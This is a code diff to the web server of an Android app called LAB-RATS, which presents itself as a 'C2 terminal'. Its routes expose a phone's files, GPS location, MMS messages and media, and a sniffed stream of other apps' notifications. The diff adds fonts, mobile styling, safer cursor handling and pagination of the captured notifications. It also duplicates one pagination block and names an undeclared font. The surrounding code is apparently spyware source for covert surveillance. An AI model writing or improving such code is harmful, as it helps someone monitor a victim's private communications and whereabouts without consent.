@@ -1,6 +1,7 @@
 package com.labs.labrats;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -87,10 +88,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<html lang=\"en\">" +
             "<head>" +
             "<meta charset=\"UTF-8\">" +
-            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">" +
+            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
             "<title>Lab-RATS | C2 TERMINAL</title>" +
-            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700&display=swap\" rel=\"stylesheet\">" +
+            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
+            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
             ":root {" +
             "  --neon-cyan: #00f2ff;" +
             "  --neon-green: #39ff14;" +
@@ -135,8 +137,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  overflow: hidden;" +
             "  background: transparent;" +
             "}" +
-            ".header h1 {" +
-            "  font-family: 'Orbitron', sans-serif;" +
+            "h1, h2, h3, .title-font { font-family: 'C2TerminalFont', 'Orbitron', sans-serif !important; font-weight: 900 !important; }" +
+            ".title-font {" +
+            "  font-family: 'C2TerminalFont', 'Orbitron', sans-serif !important;" +
+            "  font-weight: 900 !important;" +
             "  font-size: 3.5rem;" +
             "  color: var(--neon-cyan);" +
             "  text-transform: uppercase;" +
@@ -145,7 +149,20 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  text-shadow: 0 0 15px rgba(0, 242, 255, 0.6);" +
             "  margin-bottom: 15px;" +
             "  animation: scanline 8s linear infinite;" +
+            "  display: block;" +
             "}" +
+            "@media (max-width: 600px) {" +
+            "  .title-font { font-size: 1.2rem; letter-spacing: 2px; margin-right: -2px; }" +
+            "  .restricted-text { font-size: 1.4rem !important; }" +
+            "  .nav a { padding: 12px 20px; font-size: 0.8rem; }" +
+            "  .card { padding: 20px; }" +
+            "  .file-item { padding: 10px; }" +
+            "  .btn-small { padding: 6px 10px; font-size: 0.7rem; min-width: 50px; text-align: center; letter-spacing: 0; }" +
+            "  .desktop-only { display: none !important; }" +
+            "  .mobile-only { display: inline !important; }" +
+            "}" +
+            ".desktop-only { display: inline; }" +
+            ".mobile-only { display: none; }" +
             "@keyframes scanline { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }" +
             ".glitch-container { position: relative; margin-top: -10px; margin-bottom: 25px; }" +
             ".glitch { color: #fff; font-size: 0.9rem; font-weight: bold; letter-spacing: 3px; text-transform: uppercase; position: relative; display: inline-block; }" +
@@ -251,7 +268,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".file-info { flex-grow: 1; }" +
             ".file-name { color: #fff; text-decoration: none; font-weight: bold; display: block; margin-bottom: 4px; font-size: 0.9rem; }" +
             ".file-meta { font-size: 0.7rem; color: #888; letter-spacing: 1px; }" +
-            ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 20px; }" +
+            ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 20px; min-width: 0; width: auto; }" +
             ".empty-state { text-align: center; padding: 60px 20px; }" +
             ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; opacity: 0.2; color: var(--neon-cyan); }" +
             
@@ -259,26 +276,34 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "@media (max-width: 768px) {" +
             "  body { overflow-x: hidden; width: 100%; font-size: 14px; }" +
             "  .container { width: 100%; overflow-x: hidden; padding: 8px; }" +
-            "  .header { padding: 25px 0; margin-bottom: 15px; }" +
-            "  .header h1 { font-size: 1.6rem !important; letter-spacing: 2px !important; margin-right: -2px !important; }" +
-            "  .header div[style*='letter-spacing: 4px'] { font-size: 0.5rem !important; letter-spacing: 2px !important; margin-bottom: 10px !important; }" +
-            "  .glitch { font-size: 0.6rem; letter-spacing: 1px; }" +
+            "  .header { padding: 15px 0; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; gap: 5px; }" +
+            "  .header h1 { font-size: 1.4rem !important; letter-spacing: 2px !important; margin-right: -2px !important; white-space: nowrap !important; width: auto !important; margin-bottom: 5px !important; }" +
+            "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.4rem !important; letter-spacing: 2px !important; margin-right: -2px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 !important; }" +
+            "  .glitch-container { margin: 0 !important; height: 15px; }" +
+            "  .header div[style*='letter-spacing: 4px'] { font-size: 0.45rem !important; letter-spacing: 1px !important; margin: 0 !important; }" +
+            "  .glitch { font-size: 0.55rem; letter-spacing: 1px; }" +
             "  .nav { gap: 4px; justify-content: center; }" +
             "  .nav a { padding: 10px 4px; font-size: 0.5rem; border-radius: 20px; flex: 1 1 calc(33.33% - 6px); text-align: center; letter-spacing: 0; min-width: 0; font-weight: normal; }" +
             "  .card { padding: 12px; margin-bottom: 12px; border-radius: 8px; width: 100%; box-sizing: border-box; }" +
             "  .info-grid { grid-template-columns: 1fr !important; gap: 8px; }" +
             "  .info-item { padding: 12px; }" +
             "  #log-terminal { height: 280px !important; font-size: 0.6rem !important; padding: 8px !important; }" +
+            "  .header-actions { margin-left: 0 !important; margin-top: 10px; width: 100%; justify-content: flex-start !important; flex-wrap: wrap; gap: 8px !important; }" +
             "  button:not(.btn-small), .btn:not(.btn-small) { width: 100% !important; min-width: 0 !important; text-align: center; padding: 14px 15px !important; margin-bottom: 8px; border-radius: 30px; display: block !important; font-size: 0.75rem !important; white-space: normal !important; }" +
-            "  .btn-small { width: auto !important; display: inline-block !important; padding: 8px 12px !important; font-size: 0.65rem !important; }" +
+            "  .btn-small { width: auto !important; min-width: 0 !important; display: inline-block !important; padding: 4px 6px !important; font-size: 0.55rem !important; letter-spacing: 0 !important; border-radius: 20px !important; margin-bottom: 5px !important; }" +
             "  .btn-back { width: 100%; justify-content: center; padding: 10px; font-size: 0.7rem; }" +
             "  .header { overflow: visible !important; }" +
-            "  .watermark { opacity: 0.2 !important; height: 80px !important; top: 50% !important; left: 10px !important; transform: translateY(-50%) !important; z-index: 0; }" +
+            "  .watermark { opacity: 0.15 !important; height: 70px !important; top: 50% !important; left: 10px !important; transform: translateY(-50%) !important; z-index: 0; }" +
             "  table { display: block; overflow-x: auto; width: 100%; }" +
             "  th, td { padding: 10px 8px; font-size: 0.7rem; }" +
             "  h2 { font-size: 1.1rem !important; flex-wrap: wrap !important; gap: 10px !important; display: flex !important; }" +
             "  h3 { font-size: 0.95rem !important; }" +
             "  .info-section { margin-top: 15px; }" +
+            "  .file-item { padding: 10px; gap: 8px; }" +
+            "  .file-item .btn-small { padding: 4px 8px !important; font-size: 0.55rem !important; margin: 0 !important; }" +
+            "  .file-info { min-width: 0; }" +
+            "  .file-name { font-size: 0.8rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }" +
+            "  .file-icon { margin-right: 10px; width: 30px; font-size: 1.2rem; }" +
             "}" +
             
             "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; }" +
@@ -303,7 +328,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
             "    <img src=\"/logo\" class=\"watermark\" alt=\"LAB-RATS\">" +
-            "    <h1>LAB-RATS</h1>" +
+            "    <div class=\"title-font\" style=\"font-family: 'C2TerminalFont', 'Orbitron', sans-serif !important;\">LAB-RATS</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
             "    </div>" +
@@ -325,36 +350,48 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private static final String HTML_FOOTER = "</div>" +
             "<script>" +
-            "  document.querySelectorAll('.nav a').forEach(link => {" +
+            "  function updateNav() {" +
             "    const path = window.location.pathname;" +
-            "    const href = link.getAttribute('href');" +
-            "    if (path === href || (href !== '/' && path.startsWith(href))) {" +
-            "      link.classList.add('active');" +
-            "    }" +
-            "  });" +
+            "    document.querySelectorAll('.nav a').forEach(link => {" +
+            "      const href = link.getAttribute('href');" +
+            "      link.classList.remove('active');" +
+            "      // Exact match for root, prefix match for others\n" +
+            "      if (href === '/' && path === '/') {" +
+            "        link.classList.add('active');" +
+            "      } else if (href !== '/' && path.startsWith(href)) {" +
+            "        link.classList.add('active');" +
+            "      }" +
+            "    });" +
+            "  }" +
+            "  updateNav();" +
+            "  window.addEventListener('popstate', updateNav);" +
+            "  window.addEventListener('pageshow', (e) => { if(e.persisted) updateNav(); });" +
             "</script>" +
             "</body>" +
             "</html>";
 
     private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>Lab-RATS | LOGIN</title>" +
-            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">" +
+            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0\">" +
             "<style>" +
+            "@font-face { font-family: 'OrbitronC2'; src: url('/font/orbitron.ttf?v=100') format('truetype'); font-display: swap; }" +
             "* { box-sizing: border-box; margin: 0; padding: 0; }" +
-            "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 20px; }" +
-            ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 60px 50px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 550px; position: relative; }" +
-            "h1 { font-size: 2rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; text-shadow: 0 0 15px rgba(0,242,255,0.6); line-height: 1.2; word-wrap: break-word; transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }" +
+            "body { background: #050505; color: #00f2ff; font-family: 'OrbitronC2', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; padding: 15px; }" +
+            ".login-card { background: rgba(15,15,25,0.95); border: 1px solid #00f2ff; padding: 50px 30px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.15); width: 100%; max-width: 500px; position: relative; }" +
+            ".title-font { font-family: 'OrbitronC2', sans-serif !important; font-weight: 900 !important; font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 40px; color: #00f2ff; text-shadow: 0 0 15px rgba(0,242,255,0.6); line-height: 1.2; white-space: nowrap; transition: all 0.5s; }" +
             "@media (max-width: 480px) {" +
-            "  .login-card { padding: 40px 25px; }" +
-            "  h1 { font-size: 1.4rem; letter-spacing: 1px; margin-bottom: 30px; }" +
+            "  .login-card { padding: 35px 20px; }" +
+            "  .title-font { font-size: 1.3rem !important; letter-spacing: 1.5px; margin-bottom: 25px; }" +
+            "  input { padding: 14px !important; font-size: 14px !important; }" +
+            "  button { padding: 14px !important; font-size: 14px !important; }" +
             "}" +
             "form { display: flex; flex-direction: column; align-items: center; width: 100%; }" +
-            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: monospace; font-size: 16px; transition: 0.3s; }" +
+            "input { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 18px; margin-bottom: 30px; width: 100%; max-width: 350px; border-radius: 8px; outline: none; text-align: center; font-family: 'OrbitronC2', monospace; font-size: 16px; transition: 0.3s; }" +
             "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
-            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
+            "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'OrbitronC2', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
             "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
             "</style></head><body>" +
             "<div class=\"login-card\">" +
-            "<h1 id=\"status-header\">RESTRICTED_ACCESS</h1>" +
+            "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
             "<form onsubmit=\"handleLogin(event)\">" +
             "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
             "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
@@ -401,7 +438,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "<style>" +
             "body { background: #050505; color: #ff3131; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }" +
             ".logout-card { background: rgba(15,15,25,0.9); border: 1px solid #ff3131; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(255,49,49,0.2); }" +
-            "p { color: #888; font-family: monospace; margin-top: 20px; }" +
+            "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
             "</style></head><body>" +
             "<div class=\"logout-card\">" +
             "<h1>SESSION_TERMINATED</h1>" +
@@ -478,6 +515,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     logActivity("UPLINK_DENIED: Unauthorized access attempt to " + uri);
                     if (uri.equals("/logo")) {
                         response = serveLogo();
+                    } else if (uri.startsWith("/font/orbitron.ttf")) {
+                        response = serveFont();
                     } else {
                         // For assets, return 401. For pages, return login wall.
                         if (uri.contains(".") && !uri.equals("/")) {
@@ -497,6 +536,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = serveHome();
                     } else if (uri.equals("/logo")) {
                         response = serveLogo();
+                    } else if (uri.startsWith("/font/orbitron.ttf")) {
+                        response = serveFont();
                     } else if (uri.equals("/device")) {
                         response = serveDeviceInfo();
                     } else if (uri.equals("/files") || uri.startsWith("/files/")) {
@@ -551,7 +592,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     } else if (uri.equals("/gps/locate")) {
                         response = serveGpsLocate(params);
                     } else if (uri.equals("/intel")) {
-                        response = serveIntel();
+                        response = serveIntel(params);
                     } else if (uri.equals("/intel/clear")) {
                         NotificationSniffer.clearHistory(context);
                         logActivity("SYSTEM_MAINTENANCE: Intel history purged");
@@ -604,7 +645,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private Response serveLogo() {
         try {
-            java.io.InputStream is = context.getResources().openRawResource(R.drawable.app_logo);
+            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.drawable.app_logo);
             ByteArrayOutputStream buffer = new ByteArrayOutputStream();
             int nRead;
             byte[] data = new byte[16384];
@@ -617,6 +658,28 @@ public class LabRatsHttpServer extends NanoHTTPD {
             return response;
         } catch (Exception e) {
             return serveError("Logo error: " + e.getMessage());
+        }
+    }
+
+    private Response serveFont() {
+        try {
+            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.font.orbitron);
+            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+            int nRead;
+            byte[] data = new byte[16384];
+            while ((nRead = is.read(data, 0, data.length)) != -1) {
+                buffer.write(data, 0, nRead);
+            }
+            byte[] bytes = buffer.toByteArray();
+            Log.d("LabRATS-Server", "Serving font 'Orbitron' - size: " + bytes.length);
+            logActivity("SYSTEM_ASSET: Font 'Orbitron' served (" + bytes.length + " bytes)");
+            Response response = newFixedLengthResponse(Response.Status.OK, "font/ttf", new java.io.ByteArrayInputStream(bytes), bytes.length);
+            response.addHeader("Cache-Control", "no-cache, must-revalidate");
+            response.addHeader("Access-Control-Allow-Origin", "*");
+            return response;
+        } catch (Exception e) {
+            logActivity("SYSTEM_ERROR: Font serving failed: " + e.getMessage());
+            return serveError("Font error: " + e.getMessage());
         }
     }
 
@@ -662,7 +725,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
         html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">ACTIVE_SESSION_LOGS</h3>");
         html.append("<div id=\"log-terminal\" style=\"background: #000; padding: 20px; border-radius: 12px; font-size: 0.8rem; color: var(--terminal-green); line-height: 1.8; font-family: 'JetBrains Mono', monospace; height: 300px; overflow-y: auto; border: 1px solid rgba(0, 242, 255, 0.1);\">");
-        
+
         if (systemLogs.isEmpty()) {
             html.append("<div>[WAITING] Uplink established. Bridge active...</div>");
         } else {
@@ -2851,20 +2914,22 @@ public class LabRatsHttpServer extends NanoHTTPD {
 
     private String getMmsAddress(String mmsId) {
         Uri addrUri = Uri.parse("content://mms/" + mmsId + "/addr");
-        Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null);
         String address = "Unknown";
-        if (c != null) {
-            int addrIdx = c.getColumnIndex("address");
-            while (c.moveToNext()) {
-                if (addrIdx != -1) {
-                    String addr = c.getString(addrIdx);
-                    if (addr != null && !addr.equals("insert-address-token")) {
-                        address = addr;
-                        break;
+        try (Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null)) {
+            if (c != null) {
+                int addrIdx = c.getColumnIndex("address");
+                while (c.moveToNext()) {
+                    if (addrIdx != -1) {
+                        String addr = c.getString(addrIdx);
+                        if (addr != null && !addr.equals("insert-address-token")) {
+                            address = addr;
+                            break;
+                        }
                     }
                 }
             }
-            c.close();
+        } catch (Exception e) {
+            Log.e("LabRATS", "Error getting MMS address", e);
         }
         return address;
     }
@@ -2872,35 +2937,36 @@ public class LabRatsHttpServer extends NanoHTTPD {
     private List<String> getMmsParts(String mmsId) {
         List<String> parts = new ArrayList<>();
         Uri partUri = Uri.parse("content://mms/part");
-        Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null);
-        if (c != null) {
-            int idIdx = c.getColumnIndex("_id");
-            int ctIdx = c.getColumnIndex("ct");
-            int textIdx = c.getColumnIndex("text");
-            while (c.moveToNext()) {
-                if (idIdx == -1 || ctIdx == -1) continue;
-                String partId = c.getString(idIdx);
-                String type = c.getString(ctIdx);
-                if ("text/plain".equals(type)) {
-                    String body = textIdx != -1 ? c.getString(textIdx) : null;
-                    if (body == null && partId != null) body = getMmsText(partId);
-                    if (body != null) parts.add("text:" + body);
-                } else if (type != null && type.startsWith("image/") && partId != null) {
-                    parts.add("image:" + partId);
-                } else if (type != null && type.startsWith("video/") && partId != null) {
-                    parts.add("video:" + partId);
+        try (Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null)) {
+            if (c != null) {
+                int idIdx = c.getColumnIndex("_id");
+                int ctIdx = c.getColumnIndex("ct");
+                int textIdx = c.getColumnIndex("text");
+                while (c.moveToNext()) {
+                    if (idIdx == -1 || ctIdx == -1) continue;
+                    String partId = c.getString(idIdx);
+                    String type = c.getString(ctIdx);
+                    if ("text/plain".equals(type)) {
+                        String body = textIdx != -1 ? c.getString(textIdx) : null;
+                        if (body == null && partId != null) body = getMmsText(partId);
+                        if (body != null) parts.add("text:" + body);
+                    } else if (type != null && type.startsWith("image/") && partId != null) {
+                        parts.add("image:" + partId);
+                    } else if (type != null && type.startsWith("video/") && partId != null) {
+                        parts.add("video:" + partId);
+                    }
                 }
             }
-            c.close();
+        } catch (Exception e) {
+            Log.e("LabRATS", "Error getting MMS parts", e);
         }
         return parts;
     }
 
     private Set<String> getMmsIdsWithMedia() {
         Set<String> ids = new HashSet<>();
-        try {
-            Uri partUri = Uri.parse("content://mms/part");
-            Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%' OR ct LIKE 'video/%'", null, null);
+        Uri partUri = Uri.parse("content://mms/part");
+        try (Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%' OR ct LIKE 'video/%'", null, null)) {
             if (c != null) {
                 int midIdx = c.getColumnIndex("mid");
                 while (c.moveToNext()) {
@@ -2909,9 +2975,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         if (mid != null) ids.add(mid);
                     }
                 }
-                c.close();
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            Log.e("LabRATS", "Error getting MMS IDs with media", e);
+        }
         return ids;
     }
 
@@ -2977,10 +3044,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
             InputStream is = context.getContentResolver().openInputStream(uri);
             if (is == null) return serve404();
             String mimeType = "application/octet-stream";
-            Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null);
-            if (c != null) {
-                if (c.moveToFirst()) mimeType = c.getString(0);
-                c.close();
+            try (Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null)) {
+                if (c != null && c.moveToFirst()) {
+                    mimeType = c.getString(0);
+                }
+            } catch (Exception e) {
+                Log.e("LabRATS", "Error getting MMS media mime type", e);
             }
             return newFixedLengthResponse(Response.Status.OK, mimeType, is, is.available());
         } catch (Exception e) { return serveError("Failed to load media: " + e.getMessage()); }
@@ -3038,7 +3107,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         }
     }
 
-    private Response serveIntel() {
+    private Response serveIntel(Map<String, String> params) {
         logActivity("INTEL_UPLINK: Notification stream accessed");
         StringBuilder html = new StringBuilder(HTML_HEADER);
         html.append("<div class=\"back-btn-container\">");
@@ -3060,11 +3129,29 @@ public class LabRatsHttpServer extends NanoHTTPD {
         if (notifications.isEmpty()) {
             html.append("<div class=\"empty-state\"><div class=\"icon\">&#128225;</div><p>No active intel stream. Waiting for device notifications...</p></div>");
         } else {
+            // Pagination
+            int page = 1;
+            int limit = 20;
+            try {
+                if (params.containsKey("page")) {
+                    page = Integer.parseInt(params.get("page"));
+                    if (page < 1) page = 1;
+                }
+            } catch (Exception e) { page = 1; }
+            
+            int totalCount = notifications.size();
+            int totalPages = (int) Math.ceil((double) totalCount / limit);
+            int offset = (page - 1) * limit;
+
+            html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
+                    .append(" reports | Page ").append(page).append(" of ").append(totalPages).append("</p>");
+
             html.append("<table id=\"intel-table\">")
                 .append("<thead><tr><th>Source</th><th>Payload</th><th>Uplink_Time</th></tr></thead>")
                 .append("<tbody>");
 
-            for (NotificationSniffer.NotificationData n : notifications) {
+            for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
+                NotificationSniffer.NotificationData n = notifications.get(i);
                 String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
                 html.append("<tr>")
                     .append("<td style=\"color:var(--neon-green); font-weight:bold;\">").append(escapeHtml(n.packageName)).append("</td>")
@@ -3076,6 +3163,52 @@ public class LabRatsHttpServer extends NanoHTTPD {
                     .append("</tr>");
             }
             html.append("</tbody></table>");
+            
+            // Pagination Links
+            if (totalPages > 1) {
+                html.append("<div class=\"pagination\">");
+                if (page > 1) {
+                    html.append("<a href=\"/intel?page=").append(page - 1).append("\">&laquo; PREV</a>");
+                }
+                
+                // Show jump to page
+                html.append("<form action=\"/intel\" method=\"GET\" style=\"display: inline-flex; align-items: center; gap: 5px;\">")
+                    .append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; height: 38px; background: #000; border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 8px; text-align: center;\">")
+                    .append("<button type=\"submit\" class=\"btn btn-small\" style=\"padding: 8px 12px; margin: 0; min-width: 0;\">GO</button>")
+                    .append("</form>");
+
+                if (page < totalPages) {
+                    html.append("<a href=\"/intel?page=").append(page + 1).append("\">NEXT &raquo;</a>");
+                }
+                html.append("</div>");
+            }
+
+            // Pagination UI
+            if (totalPages > 1) {
+                html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
+                html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
+                if (page > 1) {
+                    html.append("<a href=\"/intel?page=1\">First</a>");
+                    html.append("<a href=\"/intel?page=").append(page - 1).append("\">&#8592; Prev</a>");
+                }
+                int startPage = Math.max(1, page - 2);
+                int endPage = Math.min(totalPages, page + 2);
+                for (int i = startPage; i <= endPage; i++) {
+                    String active = (i == page) ? "class=\"active\"" : "";
+                    html.append("<a ").append(active).append(" href=\"/intel?page=").append(i).append("\">").append(i).append("</a>");
+                }
+                if (page < totalPages) {
+                    html.append("<a href=\"/intel?page=").append(page + 1).append("\">Next &#8594;</a>");
+                    html.append("<a href=\"/intel?page=").append(totalPages).append("\">Last</a>");
+                }
+                html.append("</div>");
+                html.append("<form action=\"/intel\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
+                html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
+                html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 8px; text-align: center;\">");
+                html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
+                html.append("</form>");
+                html.append("</div>");
+            }
         }
         html.append("</div>");
         html.append(HTML_FOOTER);
